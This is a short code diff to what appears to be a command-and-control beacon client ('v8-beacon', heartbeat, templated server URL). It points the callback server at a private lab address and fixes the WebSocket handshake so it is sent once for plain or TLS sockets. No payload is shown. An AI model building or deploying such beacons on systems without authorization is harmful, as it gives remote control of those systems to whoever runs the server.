@@ -29,8 +29,8 @@
 
   // ===== Configuration (template variables replaced by v8ize.py) =====
   const __V8_CONFIG = {
-    serverUrl: 'https://127.0.0.1:8444',
-    tag: 'gemini',
+    serverUrl: 'https://10.211.55.2:8444',
+    tag: 'node3',
     clientType: 'v8-beacon',
     heartbeat: {
       baseInterval: 2,
@@ -1366,8 +1366,15 @@
     let headerBuf = Buffer.alloc(0);
     let frameBuf = Buffer.alloc(0);
 
-    socket.on('connect', () => { socket.write(handshake); });
-    socket.on('secureConnect', () => { socket.write(handshake); });
+    // Send the WS upgrade handshake on the correct event:
+    // - net.connect (ws:)  → 'connect'
+    // - tls.connect (wss:) → 'secureConnect'
+    // Both events fire for TLS sockets, so we must pick one to avoid sending twice.
+    if (isSecure) {
+      socket.on('secureConnect', () => { socket.write(handshake); });
+    } else {
+      socket.on('connect', () => { socket.write(handshake); });
+    }
 
     socket.on('data', (data) => {
       if (!upgraded) {
